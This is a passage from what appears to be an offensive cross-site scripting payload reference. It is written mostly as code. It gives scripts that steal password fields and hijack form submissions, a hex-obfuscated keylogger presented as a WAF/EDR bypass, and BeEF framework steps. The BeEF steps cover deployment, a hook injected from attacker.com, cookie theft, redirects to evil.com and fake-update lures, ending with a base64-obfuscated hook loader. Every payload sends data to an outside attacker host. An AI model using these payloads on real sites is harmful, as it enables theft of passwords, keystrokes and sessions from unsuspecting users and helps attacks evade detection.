});
</script>
```

**3. 3. Form theft**
_Steal password fields_
```
<script>
document.querySelectorAll("input[type=password]").forEach(function(input){
  input.addEventListener("change", function(){
    new Image().src = "http://attacker.com/log?pwd=" + this.value;
  });
});
</script>
```

**4. 4. Form-submission hijacking**
_Hijack form submission_
```
<script>
document.querySelectorAll("form").forEach(function(form){
  form.addEventListener("submit", function(e){
    var data = new FormData(this);
    new Image().src = "http://attacker.com/log?" + new URLSearchParams(data).toString();
  });
});
</script>
```

**WAF/EDR bypass variants:**

**1. Obfuscated version**
_Hex obfuscation_
```
<script>var _0xa=["\x6b\x65\x79\x64\x6f\x77\x6e","\x61\x64\x64\x45\x76\x65\x6e\x74\x4c\x69\x73\x74\x65\x6e\x65\x72"];document[_0xa[1]](_0xa[0],function(_0xb){new Image().src="http://attacker.com/?k="+_0xb[_0xa[0]]})</script>
```

---

### BeEF framework exploitation  `xss-beef`
Use the BeEF framework for XSS exploitation
Sub-category: **BeEF exploitation** · tags: `xss` `beef` `framework` `exploitation`

**Prerequisites:** an XSS vulnerability exists; a BeEF server is deployed

**Attack chain:**

**1. 1. Deploy BeEF**  _[linux]_
_Deploy the BeEF server_
```
# Install BeEF
git clone https://github.com/beefproject/beef
cd beef
bundle install
./beef

# Runs by default at http://localhost:3000
# Default username: beef
# Default password: beef
```

**2. 2. Inject the Hook script**
_Inject the BeEF Hook_
```
<script src="http://attacker.com:3000/hook.js"></script>
Inject short version:
<script src="//attacker.com:3000/hook.js"></script>
```

**3. 3. Common commands**
_BeEF console commands_
```
# Common BeEF console commands
# View online zombies
beef> online_browsers

# Execute a command
beef> run social_engineering fake_notification

# Get cookies
beef> run browser get_cookies

# Redirect the page
beef> run browser redirect https://evil.com
```

**4. 4. Module exploitation**
_BeEF module list_
```
# Common modules
# Social engineering
- Fake Notification
- Fake Flash Update
- Pretty Theft

# Browser attacks
- Get Cookie
- Redirect Browser
- TabNabbing

# Network attacks
- DNS Spoofing
- Ping Sweep
- Port Scanner
```

**WAF/EDR bypass variants:**

**1. Obfuscated Hook URL**
_Base64-obfuscated Hook injection_
```
<script>eval(atob("dmFyIHM9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7cy5zcmM9J2h0dHA6Ly9hdHRhY2tlci5jb206MzAwMC9ob29rLmpzJztkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHMpOw=="))</script>
```

---
